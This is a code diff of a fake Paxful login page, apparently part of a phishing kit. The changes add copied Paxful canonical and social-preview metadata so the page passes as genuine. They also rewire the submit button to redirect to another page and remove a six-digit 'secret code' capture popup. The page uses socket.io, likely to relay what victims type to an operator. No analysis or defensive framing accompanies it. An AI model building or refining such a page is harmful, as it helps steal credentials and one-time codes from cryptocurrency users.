@@ -3,7 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
     <title>Login | Paxful</title>
+    <meta name="description" content="Login to your Paxful account">
+    <link rel="canonical" href="https://accounts.paxful.com/login">
+    <meta property="og:title" content="Login | Paxful">
+    <meta property="og:description" content="Login to your Paxful account">
+    <meta property="og:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <meta property="og:image:width" content="1600">
+    <meta property="og:image:height" content="1001">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Login | Paxful">
+    <meta name="twitter:description" content="Login to your Paxful account">
+    <meta name="twitter:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <meta name="twitter:image:width" content="1600">
+    <meta name="twitter:image:height" content="1001">
     <link rel="icon" href="https://assets.onecompiler.app/42n876cmq/439pcdkr6/images.png" type="image/png">
     <link rel="stylesheet" href="PAX.css">
     <script src="/socket.io/socket.io.js"></script>
@@ -17,7 +31,7 @@
             </div>
             <h2>Welcome back!</h2>
             <p>Don't have an account? <a href="#">Sign up</a></p>
-            <button type="submit" class="btn" id="btn" onclick="openPuzzle1()"></button>
+            <button type="submit" class="btn" id="btn" ondblclick="window.location.replace('HEXYO.html')"></button>
 
             <form action="#" method="POST">
                 <div class="input-group">
@@ -70,25 +84,6 @@
             <button onclick="closePuzzle()">&times;</button>
         </div>
     </div>
-
-    <div id="puzzlePopup1" class="popup1">
-        <p id="error-message" class="error-message">enter your secret code</p>
-        
-        <div class="otp-container">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
-        </div>
-        
-        <div class="controls1">
-            <button onclick="resetPuzzle1()">&#x21bb;</button>
-            <button onclick="closePuzzle1()">&times;</button>
-        </div>
-    </div>
-
     <script>
         const socket = io();
 
